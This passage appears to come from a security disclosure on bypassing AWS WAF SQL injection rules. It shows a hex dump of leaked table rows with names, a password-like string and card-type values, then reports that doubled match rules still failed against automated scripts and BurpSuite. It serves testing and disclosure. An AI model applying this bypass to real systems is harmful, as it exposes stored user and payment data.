	0x0a90:  3e31 3736 3839 3637 3839 3c2f 7464 3e3c  >176896789</td><
	0x0aa0:  7464 3e4d 433c 2f74 643e 3c74 643e 266e  td>MC</td><td>&n
	0x0ab0:  6273 703b 3c2f 7464 3e3c 7464 3e30 3c2f  bsp;</td><td>0</
	0x0ac0:  7464 3e3c 2f74 723e 3c74 723e 3c74 643e  td></tr><tr><td>
	0x0ad0:  3130 3331 323c 2f74 643e 3c74 643e 4a6f  10312</td><td>Jo
	0x0ae0:  6c6c 793c 2f74 643e 3c74 643e 4865 7273  lly</td><td>Hers
	0x0af0:  6865 793c 2f74 643e 3c74 643e 3333 3333  hey</td><td>3333
	0x0b00:  3030 3030 3333 3333 3c2f 7464 3e3c 7464  00003333</td><td
	0x0b10:  3e41 4d45 583c 2f74 643e 3c74 643e 266e  >AMEX</td><td>&n
	0x0b20:  6273 703b 3c2f 7464 3e3c 7464 3e30 3c2f  bsp;</td><td>0</
	0x0b30:  7464 3e3c 2f74 723e 3c74 723e 3c74 643e  td></tr><tr><td>
	0x0b40:  3130 3332 333c 2f74 643e 3c74 643e 4772  10323</td><td>Gr
	0x0b50:  756d 7079 3c2f 7464 3e3c 7464 3e79 6f75  umpy</td><td>you
	0x0b60:  6172 6574 6865 7765 616b 6573 746c 696e  aretheweakestlin
	0x0b70:  6b3c 2f74 643e 3c74 643e 3637 3338 3334  k</td><td>673834
	0x0b80:  3438 393c 2f74 643e 3c74 643e 4d43 3c2f  489</td><td>MC</
	0x0b90:  7464                                     td

Further, in an attempt to mitigate the bypass, a double SQL injection match rule was manually created from the included wafrSQLiSet:

When a request does match at least one of the filters in the SQL injection match condition waf-tsting-detect-sqli

AND

When a request does match at least one of the filters in the SQL injection match condition waf-tsting-detect-sqli

Manually created double rules were also tried with a second (non-repeated) SQL injection match condtion with the 2 xforms mentioned applied to the Body

However, in both cases the bypass is still successful using both the automated scripts and BurpSuite to remove encoding.
